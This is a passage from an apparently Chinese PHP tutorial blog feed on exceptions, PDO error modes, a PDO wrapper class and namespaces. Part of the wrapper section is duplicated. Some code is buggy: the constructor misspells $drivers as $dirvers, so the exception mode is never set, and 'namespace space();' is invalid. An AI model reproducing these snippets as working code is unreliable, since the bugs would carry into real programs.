可能出现问题的代码块}catch(Exception $e){    echo &apos;代码运行错误！&lt;br/&gt;&apos;;    echo &apos;错误文件为：&apos; . $e-&gt;getFile() . &apos;&lt;br/&gt;&apos;;    echo &apos;错误行号为：&apos; . $e-&gt;getLine() . &apos;&lt;br/&gt;&apos;;    echo &apos;错误描述为：&apos; . $e-&gt;getMessage();    die();}</code></pre><p>6、有的时候代码如果走到了一个“死胡同”，即代码执行没有任何问题，但是不符合我们的逻辑。以前我们是跳转提示，现在可以抛出异常，交给异常来处理：throw new Exception();</p><pre><code>try{    if($n != 0){        $res = 10 / $n;    }else{        # 业务没法发展了，直接抛出异常        throw new Exception(&apos;被除数不能为0！&apos;);    }}catch(Exception $e){    echo &apos;代码运行错误！&lt;br/&gt;&apos;;    echo &apos;错误文件为：&apos; . $e-&gt;getFile() . &apos;&lt;br/&gt;&apos;;    echo &apos;错误行号为：&apos; . $e-&gt;getLine() . &apos;&lt;br/&gt;&apos;;    echo &apos;错误描述为：&apos; . $e-&gt;getMessage();    die();}</code></pre><blockquote><p>小结</p></blockquote><p>1、异常是面向对象中处理错误的一种方式，能够让整体用一种统一的方式对外处理错误</p><p>2、异常机制是利用try{}catch(Exception $e){}来进行捕捉和处理的，Exception类提供了很多方法可以方便获取各种错误相关信息</p><p>3、php默认是警告模式（还有静默模式和异常模式），即直接系统给出错误，如果想使用异常处理，那么就需要设置错误异常模式set_error_handler(异常回调函数)来实现</p><p>4、异常模式中，必须使用try{}catch(){}才会捕捉异常，否则只会系统提示（如果因为异常处理代码太麻烦，可以将异常处理代码封装成函数或者类来实现代码简化</p><h3 id="2、PDO错误机制"><a href="#2、PDO错误机制" class="headerlink" title="2、PDO错误机制"></a><strong>2、PDO错误机制</strong></h3><blockquote><p>目标：了解PDO中的错误机制，理解不同机制的不同效果</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>PDO错误机制</strong>：指PDO在使用过程中出现了错误（大多是SQL指令执行错误）的时候，PDO处理错误的方式。</p><ul><li>PDO中提供了三种错误机制，是通过PDO的常量PDO::ATTR_ERRMODE来选择的<ul><li>PDO::ERRMODE_SILENT：静默模式，出错了不处理（默认的）</li><li>PDO::ERRMODE_WARNING：警告模式，出错了立马给出错误提示</li><li>PDO::ERRMODE_EXCEPTION：异常模式，出错了将错误交给异常PDOException对象</li></ul></li></ul><blockquote><p>示例</p></blockquote><p>1、PDO::ERRMODE_SILENT静默模式</p><pre><code>$pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2&apos;,&apos;root&apos;,&apos;root&apos;);$pdo-&gt;exec(&apos;insert into t_40 values()&apos;);        # 错误：但是不会报错</code></pre><p>2、PDO::ERRMODE_WARNING警告模式</p><pre><code>$pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2&apos;,&apos;root&apos;,&apos;root&apos;);# 设定处理模式为警告模式$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);$pdo-&gt;exec(&apos;insert into t_40 values()&apos;);        # 错误：系统直接报错</code></pre><p>3、PDO::ERRMODE_EXCEPTION异常模式</p><pre><code>$pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2&apos;,&apos;root&apos;,&apos;root&apos;);$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION);try{    $pdo-&gt;exec(&apos;insert into t_40 values()&apos;);    # 错误：被捕捉到}catch(PDOException $e){    # 进入到异常处理}</code></pre><blockquote><p>小结</p></blockquote><p>1、PDO提供了多种错误处理机制：静默模式、警告模式和异常模式，默认是静默模式</p><p>2、PDO可以通过PDO::setAttribute()方法来设定错误处理模式</p><h3 id="3、PDOException异常处理"><a href="#3、PDOException异常处理" class="headerlink" title="3、PDOException异常处理"></a><strong>3、PDOException异常处理</strong></h3><blockquote><p>目标：掌握PDO中异常的实际使用，能够用PDO异常机制来封装代码处理异常</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>PDOException</strong>：是PDO从Exception继承的一个用于处理PDO错误的异常类</p><ul><li><p>一般如果做一套扩展，都会从去继承Exception类来实现一套明确的错误机制（错误来自哪里）</p></li><li><p>要使用PDOException异常处理，需要设定PDO的错误模式为<strong>异常模式</strong></p></li><li><p>在PDO中可以通过两种模式来实现异常模式的设定</p><ul><li>在初始化PDO对象的时候，利用第四个参数来设定</li><li>在初始化PDO之后，利用PDO::setAttribute()方法来修改错误模式</li></ul></li></ul><blockquote><p>步骤</p></blockquote><p>1、确定使用PDO异常来处理错误</p><p>2、设定错误模式为异常模式</p><p>3、在可能出现错误的地方捕捉异常，使用PDOException类捕捉</p><blockquote><p>示例</p></blockquote><p>1、设定异常模式：利用PDO::__construct()的第四个参数实现或者在实例化PDO之后利用PDO::setAttribute()方法设置（必须在可能出错前先设置，否则前面出错的代码不会被异常捕捉到）</p><pre><code># 1.初始化PDO时设定错误模式$drivers = array(    # 可以设置多种驱动（属性设置）    PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION);$pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2&apos;,&apos;root&apos;,&apos;root&apos;,$drivers);# 2.使用属性设置$pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2&apos;,&apos;root&apos;,&apos;root&apos;);$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION);</code></pre><p>2、当确定了我们要使用异常模式处理之后，我们就可以针对可能出错的位置使用异常来进行捕捉了（通常是进行SQL执行的时候）</p><pre><code>$drivers = array(    PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION);$pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2&apos;,&apos;root&apos;,&apos;root&apos;,$drivers);# 执行SQLtry{    $pdo-&gt;exec(&apos;set names utf-8&apos;);        # 错误}catch(PDOException $e){    echo &apos;SQL执行错误！&lt;br/&gt;&apos;;    echo &apos;错误文件为：&apos; . $e-&gt;getFile() . &apos;&lt;br/&gt;&apos;;    echo &apos;错误行号为：&apos; . $e-&gt;getLine() . &apos;&lt;br/&gt;&apos;;    echo &apos;错误描述为：&apos; . $e-&gt;getMessage();    die();}</code></pre><p>3、从PDO执行来讲，因为PDO异常模式的设置是在PDO实例化之后，那么如果PDO实例化的时候错误，此时好像PDOException就无法工作了。事实上，PDO也考虑到了这点，所以PDO实例化的时候，本身是可以使用try{}catch(){}来捕获的</p><pre><code>$drivers = array(    PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION);# 实例化PDOtry{    $pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2&apos;,&apos;root&apos;,&apos;root&apos;,$drivers);}catch(PDOException $e){    echo &apos;数据库连接失败！&lt;br/&gt;&apos;;    echo &apos;错误文件为：&apos; . $e-&gt;getFile() . &apos;&lt;br/&gt;&apos;;    echo &apos;错误行号为：&apos; . $e-&gt;getLine() . &apos;&lt;br/&gt;&apos;;    echo &apos;错误描述为：&apos; . iconv(&apos;gbk&apos;,&apos;utf-8&apos;,$e-&gt;getMessage());    die();}</code></pre><p>4、PDO执行过程中，如果碰到了意外（逻辑无法继续执行），那么也可以主动抛出异常</p><pre><code>$drivers = array(    PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION);# 实例化PDOtry{    $pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2&apos;,&apos;root&apos;,&apos;root&apos;,$drivers);}catch(PDOException $e){    echo &apos;数据库连接失败！&lt;br/&gt;&apos;;    echo &apos;错误文件为：&apos; . $e-&gt;getFile() . &apos;&lt;br/&gt;&apos;;    echo &apos;错误行号为：&apos; . $e-&gt;getLine() . &apos;&lt;br/&gt;&apos;;    echo &apos;错误描述为：&apos; . $e-&gt;getMessage();    die();}# 抓异常try{    $pdo-&gt;exec(&apos;insert into t_40 values&apos;);    $id = $pdo-&gt;lastInsertID();    if(!$id) throw new PDOException(&apos;没有拿到自增长ID：插入失败&apos;);}catch(PDOException $e){    echo &apos;SQL执行失败！&lt;br/&gt;&apos;;    echo &apos;错误文件为：&apos; . $e-&gt;getFile() . &apos;&lt;br/&gt;&apos;;    echo &apos;错误行号为：&apos; . $e-&gt;getLine() . &apos;&lt;br/&gt;&apos;;    echo &apos;错误描述为：&apos; . $e-&gt;getMessage();    die();}</code></pre><blockquote><p>小结</p></blockquote><p>1、PDOException是一种用来捕获异常PDO（PDOStatement）类使用过程中产生的错误的</p><p>2、PDOException在使用之前需要开启PDO的异常模式（PDO的实例化除外，可以直接捕捉）</p><p>3、因为要处理的异常通常类似，都是一些与用户相关的操作，所以可以也应该对这种处理进行封装处理（独立出来）</p><p>4、PDOException一般是在SQL执行过程中出错，如果其他代码执行过程中，业务逻辑不符合要求（代码没问题），那么也可以使用throw new PDOException()来实现抛出异常</p><h2 id="四、-封装PDO【掌握】"><a href="#四、-封装PDO【掌握】" class="headerlink" title="四、 封装PDO【掌握】"></a><strong>四、 封装PDO【掌握】</strong></h2><blockquote><p>目标：理解外部或者系统类的优缺点，思考自己开发时要如何使用，对已有类可以进行二次封装</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>封装PDO</strong>:即对PDO进行二次封装，从而让原本多处需要使用PDO的地方，能够直接使用二次封装的类，简化数据库操作</p><ul><li>PDO类要使用的话每次都需要进行初始化操作，而且不够灵活</li><li>PDO类要进行某些操作的时候，需要进行较多步骤实现</li><li>PDO类默认不是异常处理</li></ul><blockquote><p>步骤</p></blockquote><p>1、明确PDO需要封装的内容</p><ul><li>PDO的实例化：得到PDO对象，而且PDO对象需要在不同的方法中使用，可以考虑将PDO得到的对象保存在属性中</li><li>写操作：包含普通SQL执行返回受影响行和获取自增长ID</li><li>查操作：包含单行查询和多行查询</li><li>隐藏操作：异常处理的封装</li><li>其他操作：根据实际需求增加对应功能即可</li></ul><p>2、使用命名空间方便使用</p><blockquote><p>示例</p></blockquote><p>1、增加命名空间：并引入系统类（系统类不能自动跨全局空间进入到子空间）</p><pre><code># 命名空间：因为PDO通常属于核心类（项目中几乎每次都会访问数据库），使用核心关键字core命名namespace core;# 有了命名空间，所以PDO的三个类就不再直接使用，需要使用完全限定名称访问，为了方便，可以事先引入元素use \PDO,\PDOStatement,\PDOException;</code></pre><p>2、定义类：增加必要属性（PDO对象）</p><pre><code>class MyPDO{    # 属性    private $pdo;    private $fetch_mode;    public $error;}</code></pre><p>3、增加初始化方法：得到PDO对象：考虑参数的外部传入和默认值，数据较多可以采用关联数组（异常处理）</p><pre><code># 构造方法# 默认采用PDO异常和获取关联数组设定public function __construct($database_info = array(),$drivers = array()){    # 如果要考虑细致，可以看看是否存在    $type = $database_info[&apos;type&apos;] ?? &apos;mysql&apos;;        # 默认mysql数据库    $host = $database_info[&apos;host&apos;] ?? &apos;localhost&apos;;    $port = $database_info[&apos;port&apos;] ?? &apos;3306&apos;;    $user = $database_info[&apos;user&apos;] ?? &apos;root&apos;;    $pass = $database_info[&apos;pass&apos;] ?? &apos;root&apos;;    $dbname = $database_info[&apos;dbname&apos;] ?? &apos;db_2&apos;;    $charset = $database_info[&apos;charset&apos;] ?? &apos;utf8&apos;;    # fetchmode不能在初始化的时候实现，需要在得到PDOStatement类对象好设置    $this-&gt;fetch_mode = $dirvers[PDO::ATTR_DEFAULT_FETCH_MODE] ?? PDO::FETCH_ASSOC;    # 控制属性    if(!isset($dirvers[PDO::ATTR_ERRMODE]))        $dirvers[PDO::ATTR_ERRMODE] = PDO::ERRMODE_EXCEPTION;    # 连接认证    try{        # 增加错误抑制符防止意外        $this-&gt;pdo = @new PDO($type . &apos;:host=&apos; . $host . &apos;;port=&apos; . $port . &apos;;dbname=&apos; . $dbname . &apos;;charset=&apos; . $charset,$user,$pass,$drivers);    }catch(PDOException $e){        # 属性记录错误        $this-&gt;error[&apos;file&apos;] = $e-&gt;getFile();        $this-&gt;error[&apos;line&apos;] = $e-&gt;getLine();        $this-&gt;error[&apos;error&apos;]= $e-&gt;getMessage();        # 返回false，让外部处理        return false;    }   }</code></pre><p>4、发现异常会经常用到，因此可以将异常封装到方法，从而到处调用（对内调用）</p><pre><code># 异常处理方法private function my_exception(PDOException $e){    $this-&gt;error[&apos;file&apos;] = $e-&gt;getFile();    $this-&gt;error[&apos;line&apos;] = $e-&gt;getLine();    $this-&gt;error[&apos;error&apos;]= $e-&gt;getMessage();    return false;}</code></pre><p><strong>注意</strong>：此时就可以调整构造方法中关于初始化PDO对象的异常处理部分为异常方法</p><p>5、增加写SQL操作方法：对外调用</p><pre><code># 写操作public function my_exec($sql){    try{        # 调用执行：成功返回，错误捕捉        return $this-&gt;pdo-&gt;exec($sql);    }catch(PDOException $e){        return $this-&gt;my_exception($e);    }}</code></pre><p>6、完善写操作：增加对外提供自增长id方法</p><pre><code># 获取自增长IDpublic function my_last_insert_id(){    return $this-&gt;pdo-&gt;lastInsertId();}</code></pre><p>7、增加读方法：对外调用</p><pre><code># 读方法：按条件进行单行或者多行数据返回public function my_query($sql,$only = true){    try{        $stmt = $this-&gt;pdo-&gt;query($sql);        # 设置查询模式        $stmt-&gt;setFetchMode($this-&gt;fetch_mode);    }catch(PDOException $e){        return $this-&gt;my_exception($e);    }    # 数据解析    if($only)        return $stmt-&gt;fetch();    else        return $stmt-&gt;fetchAll();}</code></pre><blockquote><p>小结</p></blockquote><p>1、PDO的使用是经常性的，所以我们需要将PDO变得更加灵活，更加贴近我们的项目，从而实现更多代码的复用，因此需要对PDO进行二次封装</p><p>2、PDO的封装是要根据项目需求来实现的，如果只是基础功能，那么实现了增删改查即可；而如果项目里要用到更多的内容，如事务、预处理之类的，那么就需要进行更多的封装</p><pre><code>    # 返回false，让外部处理    return false;}   </code></pre><p>}</p><pre><code>4、发现异常会经常用到，因此可以将异常封装到方法，从而到处调用（对内调用）```php# 异常处理方法private function my_exception(PDOException $e){    $this-&gt;error[&apos;file&apos;] = $e-&gt;getFile();    $this-&gt;error[&apos;line&apos;] = $e-&gt;getLine();    $this-&gt;error[&apos;error&apos;]= $e-&gt;getMessage();    return false;}</code></pre><p><strong>注意</strong>：此时就可以调整构造方法中关于初始化PDO对象的异常处理部分为异常方法</p><p>5、增加写SQL操作方法：对外调用</p><pre><code># 写操作public function my_exec($sql){    try{        # 调用执行：成功返回，错误捕捉        return $this-&gt;pdo-&gt;exec($sql);    }catch(PDOException $e){        return $this-&gt;my_exception($e);    }}</code></pre><p>6、完善写操作：增加对外提供自增长id方法</p><pre><code># 获取自增长IDpublic function my_last_insert_id(){    return $this-&gt;pdo-&gt;lastInsertId();}</code></pre><p>7、增加读方法：对外调用</p><pre><code># 读方法：按条件进行单行或者多行数据返回public function my_query($sql,$only = true){    try{        $stmt = $this-&gt;pdo-&gt;query($sql);        # 设置查询模式        $stmt-&gt;setFetchMode($this-&gt;fetch_mode);    }catch(PDOException $e){        return $this-&gt;my_exception($e);    }    # 数据解析    if($only)        return $stmt-&gt;fetch();    else        return $stmt-&gt;fetchAll();}</code></pre><blockquote><p>小结</p></blockquote><p>1、PDO的使用是经常性的，所以我们需要将PDO变得更加灵活，更加贴近我们的项目，从而实现更多代码的复用，因此需要对PDO进行二次封装</p><p>2、PDO的封装是要根据项目需求来实现的，如果只是基础功能，那么实现了增删改查即可；而如果项目里要用到更多的内容，如事务、预处理之类的，那么就需要进行更多的封装</p><p>3、封装好的PDO类，我们可以更加方便的去实现我们的业务需求（实例化以及调用具体方法即可，后续学习还有办法实现更简单的调用）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php面向对象:命令空间</title>
      <link href="/2021/07/25/php%E5%AD%A6%E4%B9%A0/4PHP%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%EF%BC%9A%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/"/>
      <url>/2021/07/25/php%E5%AD%A6%E4%B9%A0/4PHP%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%EF%BC%9A%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/</url>
      
        <content type="html"><![CDATA[<h4 id="转载于：黑马程序员武汉中心"><a href="#转载于：黑马程序员武汉中心" class="headerlink" title="转载于：黑马程序员武汉中心"></a>转载于：<a href="https://space.bilibili.com/434398031?spm_id_from=333.788.b_765f7570696e666f.1" target="_blank" rel="noopener">黑马程序员武汉中心</a></h4><h1 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a><strong>命名空间</strong></h1><blockquote><p>学习目标：理解命名空间的概念，掌握命名空间存在的价值以及解决的实际问题，利用命名空间实现复杂项目开发</p></blockquote><ul><li>命名空间基础</li><li>子空间</li><li>命名空间访问</li><li>全局空间</li><li>命名空间引入</li></ul><blockquote><p>概念</p></blockquote><p><strong>命名空间</strong>：namespace，指人为的将内存进行<code>分隔</code>，让不同内存区域的同名结构共存，从而解决在大型项目中可能出现的重名结构问题</p><ul><li>PHP中，同一脚本运行周期内不允许出现同名结构<ul><li>常量</li><li>函数</li><li>类（接口）</li></ul></li><li>在大型项目中，除了使用复杂的命名方式，很难避免团队间使用同名结构</li><li>命名空间可以通过给各类命名增加<code>路径</code>来实现不同名字的“本质不同”，从而允许同名存在</li></ul><blockquote><p>示例</p></blockquote><p>在Windows系统下：同一个磁盘上不允许出现同名文件，但是可以通过路径的方式（文件夹）实现同名文件存</p><pre><code>index.phpindex(1).php            # 系统不允许同名，所以会重命名</code></pre><p>但是我们可以通过不同的路径和逻辑分区来实现同名文件共同存在</p><pre><code>C:/index.phpD:/index.phpD:/server/web/index.php    # 可以同时存在：路径本身可以理解为文件的名字（三个都不同）</code></pre><ul><li>命名空间就是类似上述的操作，在同一块内存里进行<code>逻辑分区</code>实现同名结构的同时存在</li></ul><blockquote><p>小结</p></blockquote><p>1、命名空间是为了解决结构同名问题而出现的一种解决方案</p><p>2、命名空间本质是在内存中进行逻辑划分，让相同的名字分到不同的区域，从而实现<code>不同名</code></p><h2 id="1、命名空间基础"><a href="#1、命名空间基础" class="headerlink" title="1、命名空间基础"></a><strong>1、命名空间基础</strong></h2><blockquote><p>目标：了解命名空间的基本语法，掌握命名空间的限制逻辑和基本应用</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>命名空间基础</strong>：命名空间的基本语法和作用</p><ul><li><p>命名空间使用namespace关键字定义空间</p><p>namespace 命名空间名字;</p></li><li><p>命名空间必须定义在所有代码之前（前面不能有任何代码性的内容，注释除外）</p></li><li>命名空间后可以写任意内容，但是只有命名空间元素真正受空间限制</li><li>命名空间元素是结构性内容（不允许重复的内容），有三类：<ul><li>常量</li><li>函数</li><li>类（接口）</li></ul></li></ul><blockquote><p>步骤</p></blockquote><p>1、确定使用命名空间：有一些结构性的内容可能与其他开发者冲突（重名）</p><p>2、在一开始定义命名空间</p><blockquote><p>示例</p></blockquote><p>1、基本语法：namespace 空间名字;</p><pre><code># 定义空间namespace my_space;            # 定义一个叫做my_space的空间</code></pre><p>2、命名空间的命名规则</p><ul><li>由字母、下划线和数字构成</li><li>可以以字母和下划线开头</li><li>较少出现多单词空间名，一般使用下划线法</li></ul><p>3、命名空间的作用：能够创建同名结构，包含函数、常量和类</p><pre><code>namespace space1;function display(){    echo __NAMESPACE__,&apos;&lt;br/&gt;&apos;;}const PI = 3;class Human{}namespace space2;function display(){    echo __NAMESPACE__,&apos;&lt;br/&gt;&apos;;}const PI = 3.14;class Human{}</code></pre><p>4、命名空间里的内容</p><ul><li>命名空间里可以定义同名的函数、常量和类（结构）：因为此类结构不允许同名，这些是命名空间规范的目标（称为空间元素）</li><li><p>命名空间里可以有其他代码</p><p>namespace space;<br>class Human{}<br>function display(){}<br>const PI = 3.14;<br>$a = 100;<br>echo $a;</p></li></ul><p>5、命名空间注意事项：命名空间的声明（第一次）必须在所有代码之前</p><pre><code># 命名空间之前不能有任何代码namespace space1;                # 正确echo &apos;test&apos;;namespace space1;                # 错误：第一次命名空间之前不能有任何其他代码</code></pre><p><strong>注意</strong>：命名空间在一个脚本中只会定义一个（最开始），但是在讲课的时候可能会定义多个</p><blockquote><p>小结</p></blockquote><p>1、命名空间是使用namespace + 空间名字定义</p><p>2、不同命名空间里可以定义同名的函数、常量和类（同名结构）</p><p>3、命名空间里可以书写任意代码</p><p>4、命名空间的定义必须在脚本的最前面</p><p>5、一个脚本中通常只会定义一个空间</p><p>6、命名空间其实就好比是磁盘上划分的不同文件夹，用来保存同名文件</p><h2 id="2、命名空间子空间"><a href="#2、命名空间子空间" class="headerlink" title="2、命名空间子空间"></a><strong>2、命名空间子空间</strong></h2><blockquote><p>目标：理解子空间的概念，掌握子空间的创建规范</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>子空间</strong>：subspace，即在已有空间之上，再在内部进行空间划分，让每个小空间独立起来。</p><ul><li>子空间其实就是路径的分层</li><li><p>子空间可以基于已有空间创建，也可以直接创建，使用反斜杠分隔<code>\</code></p><h1 id="基于已有父空间"><a href="#基于已有父空间" class="headerlink" title="基于已有父空间"></a>基于已有父空间</h1><p>namespace father;<br>namespace father\son;</p><h1 id="直接创建子空间"><a href="#直接创建子空间" class="headerlink" title="直接创建子空间"></a>直接创建子空间</h1><p>namespace mother\daughter;</p></li></ul><blockquote><p>示例</p></blockquote><p>1、命名空间子空间是直接通过namespace+路径符号<code>\</code>实现</p><pre><code>namespace space;        # 创建一个一级空间function display(){}# 创建子空间namespace space\space1;    # 在space空间下创建一个叫做space1的子空间function display(){}</code></pre><p>2、子空间的创建不一定非要在前面创建了上级空间，即可以直接在某个脚本中创建子空间</p><pre><code># 脚本最上面namespace space\space2;function display(){}</code></pre><blockquote><p>小结</p></blockquote><p>1、子空间也是通过namespace实现，用namespace+<code>\</code>区分上下级空间名</p><p>2、基于一个脚本中通常只有一个空间名，所以子空间的创建可以直接创建</p><ul><li>不用一定先创建一级空间</li><li>但是一般是存在上级空间的，而不是凭空创建子空间</li></ul><p>3、子空间理论上可以创建无限多层，但是实际层次根据项目需求确定（一般不超过四层）</p><h2 id="3、命名空间访问"><a href="#3、命名空间访问" class="headerlink" title="3、命名空间访问"></a><strong>3、命名空间访问</strong></h2><blockquote><p>目标：掌握命名空间的元素调用方式，能够用合适的方式调用空间元素</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>命名空间访问</strong>：是指访问不同空间里的结构元素</p><ul><li>空间里有除了函数、常量和类的其他代码，会自动执行，只有空间元素本身（函数、常量和类）是需要通过空间进行访问的</li><li>在PHP命名空间中，提供了三种空间元素的访问方式<ul><li><code>非限定名称</code>：直接访问元素名，系统自动匹配当前空间（向上找到的第一个空间）</li><li><code>限定名称</code>：带空间名字，而且是基于当前空间的子空间（相对路径，在当前空间下，找到向下的空间的）</li><li><code>完全限定名称</code>：从全局空间（根目录）开始访问（绝对路径）</li></ul></li></ul><blockquote><p>示例</p></blockquote><p>1、非限定名称访问：即直接访问空间元素的名字，此类访问访问的是当前代码所属空间内的元素</p><pre><code>namespace space1;function display(){    echo &apos;space1&apos;;}namespace space2;function display(){    echo &apos;space2&apos;;}# 非限定名称访问display();                # 输出space2，因为当前display函数调用所属空间为space2</code></pre><p><strong>注意</strong>：非限定名称访问就好比是访问当前自己文件夹下的所有文件</p><p>2、限定名称访问，即在访问元素的前面使用相应的空间名字，非限定名称的访问是基于子空间来实现的</p><pre><code># 定义子空间namespace space\space1;function display(){    echo &apos;space\space1&lt;br/&gt;&apos;;}# 定义子空间namespace space\space2;function display(){    echo &apos;space\space2&lt;br/&gt;&apos;;}# 所属父空间namespace space;function display(){    echo &apos;space&lt;br/&gt;&apos;;}# 非限定名称访问display();                     # space：当前向上所属空间space1\display();             # space\space1：实际为当前空间space + space1\display()</code></pre><p><strong>注意</strong>：限定名称访问好比访问当前文件夹下的子文件夹内容（针对当前空间的子空间访问）</p><p>3、完全限定名称访问，即从根目录（全局空间）开始访问，使用<code>\</code>作为全局空间开始符号</p><pre><code># 接上述代码# 完全限定名称访问\space\display();            # space空间下的display\space\space1\display();     # space下space1空间的display</code></pre><p><strong>注意</strong>：完全限定名称访问好比从磁盘根目录访问对应路径下的内容（绝对路径）</p><blockquote><p>小结</p></blockquote><p>1、命名空间的访问分为三种模式</p><ul><li>非限定名称访问，直接访问元素本身，代表当前所属空间（当前目录）</li><li>限定名称访问，使用空间名+元素，代表访问<strong>当前空间子空间</strong>（当前目录子目录）</li><li>完全限定名称访问，使用全局空间开始，代表从全局开始进行访问（根目录）</li></ul><p>2、空间元素访问方式选择</p><ul><li>当前空间内，一般使用<code>非限定名称</code>访问</li><li>不在当前空间，一般使用<code>完全限定名称</code>访问</li><li>在实际开发中：我们会对项目进行深度封装处理，尽量让开发者可以使用非限定名称访问（开发效率高）</li></ul><h2 id="4、全局空间"><a href="#4、全局空间" class="headerlink" title="4、全局空间"></a><strong>4、全局空间</strong></h2><blockquote><p>目标：了解全局空间的概念，掌握全局空间与其他命名空间的关系以及合作模式</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>全局空间</strong>：即空间元素在没有定义空间的情况下所属的空间，也是所有定义的空间的顶级空间</p><ul><li>所有空间都是从全局空间分离出来的</li><li>所有不指定空间的元素本质都属于全局空间</li><li>全局空间与其他空间存在空间约束关系，在进行文件包含时需要注意到空间关系</li></ul><blockquote><p>示例</p></blockquote><p>1、没有指定空间的元素所属的空间属于全局空间</p><pre><code># 不定义空间function display(){    echo __NAMESPACE__,&apos;&lt;br/&gt;&apos;;}</code></pre><p>2、所有的空间本质都是在全局空间下的划分</p><pre><code># 定义空间namespace space;function display(){    echo __NAMESPACE__,&apos;&lt;br/&gt;&apos;;}# space空间属于从全局空间里划分出一部分用于space空间管理</code></pre><p>3、全局空间元素的访问：使用完全限定名称访问</p><pre><code># 不定义空间function display(){    echo __NAMESPACE__,&apos;&lt;br/&gt;&apos;;}display();                            # 非限定名称访问：本身当前就是全局空间内，所以可以访问\display();                            # 完全限定名称访问：全局符号&quot;\&quot;+全局空间元素</code></pre><p>4、一旦命名空间出现，那么空间元素（类、常量和函数）的访问就被限定在空间内，如果使用非限定名称访问，那么系统会以下解析逻辑（限定名称或者完全限定名称是直接按路径准确找）</p><ul><li>首先一定是在自己空间内查找</li><li><p>如果找不到元素，不同空间元素的处理不同</p><ul><li>系统常量、系统函数如果找不到，会自动去全局空间找（也就是能找到）</li><li>系统类是不会自动去全局空间找的（报错，提示当前所属空间内元素找不到）</li></ul><h1 id="定义空间"><a href="#定义空间" class="headerlink" title="定义空间"></a>定义空间</h1><p>namespace space;<br>function display(){</p><pre><code>echo __FUNCTION__,&apos;&lt;br/&gt;&apos;;</code></pre><p>}</p><h1 id="当前所有访问如果使用非限定名称都代表访问当前空间内的元素"><a href="#当前所有访问如果使用非限定名称都代表访问当前空间内的元素" class="headerlink" title="当前所有访问如果使用非限定名称都代表访问当前空间内的元素"></a>当前所有访问如果使用非限定名称都代表访问当前空间内的元素</h1><p>display();                # space下的display函数</p><h1 id="想访问函数"><a href="#想访问函数" class="headerlink" title="想访问函数"></a>想访问函数</h1><p>define(‘PI’,3.14);        # 正确：space下没有define函数，但是全局空间有（系统函数属于全局空间）</p><h1 id="访问系统常量"><a href="#访问系统常量" class="headerlink" title="访问系统常量"></a>访问系统常量</h1><p>echo PHP_VERSION;        # 正确：space下没有，但全局空间有</p><h1 id="想访问类"><a href="#想访问类" class="headerlink" title="想访问类"></a>想访问类</h1><h1 id="m-new-Mysqli-‘localhost’-’root’-’root’"><a href="#m-new-Mysqli-‘localhost’-’root’-’root’" class="headerlink" title="$m = new Mysqli(‘localhost’,’root’,’root’);"></a>$m = new Mysqli(‘localhost’,’root’,’root’);</h1><pre><code># 错误：系统提示space\Mysqli不存在</code></pre><h1 id="正确方案"><a href="#正确方案" class="headerlink" title="正确方案"></a>正确方案</h1><p>$m = new \Mysqli(‘localhost’,’root’,’root’);</p></li></ul><p>5、同样的，如果一个文件有空间，包含了一个没有空间（全局空间）的文件，那么要访问文件中的内容，需要使用全局空间</p><pre><code># 无空间文件：nospace.phpfunction display(){                # 属于全局空间    echo __FUNCTION__;}# 有空间文件namespace space();function display(){    echo &apos;space&apos;;}# 包含无空间文件include_once &apos;nospace.php&apos;;# 访问元素display();                    # 访问的是space空间下的display函数\display();                    # 正确：访问全局空间的display函数# 注意：如果space空间没有display的话，直接访问display函数也是正确的，因为系统会自动寻找全局空间</code></pre><blockquote><p>小结</p></blockquote><p>1、全局空间就是没有使用namespace定义空间的空间（所有空间本质都是在全局空间下划分）</p><p>2、全局空间的元素访问使用完全限定名称访问</p><p>3、系统内置的函数、常量和类都属于全局空间（涉及到全局空间被包含到子空间里）</p><ul><li>系统函数、常量，在空间内访问的时候系统会自动在自己空间找，如果找不到会去全局空间</li><li>系统类必须使用全局空间访问：\类名</li></ul><h2 id="5、命名空间应用"><a href="#5、命名空间应用" class="headerlink" title="5、命名空间应用"></a><strong>5、命名空间应用</strong></h2><blockquote><p>目标：根据实际开发需求，设定合适的命名空间进行管理</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>命名空间应用</strong>：模拟真实的开发环境，来运用命名空间的规则</p><ul><li>命名空间分层一般是文件夹进行分层（建议使用与文件夹同名空间名）</li><li>文件夹的分层是根据业务的需求和项目开发所选的复杂程度来设计</li></ul><blockquote><p>步骤</p></blockquote><p>1、确定项目开发复杂程度</p><p>2、实现文件分层管理布局</p><p>3、针对文件分层进行命名空间的使用（一个文件只属于一个空间）</p><blockquote><p>示例</p></blockquote><p>1、创建文件夹：模拟项目不同文件PHP文件放到不同文件夹下</p><p>–|root ——–根目录</p><p>–|–|controller ——–业务模块</p><p>–|–|model ——–数据模块</p><p>–|–|core 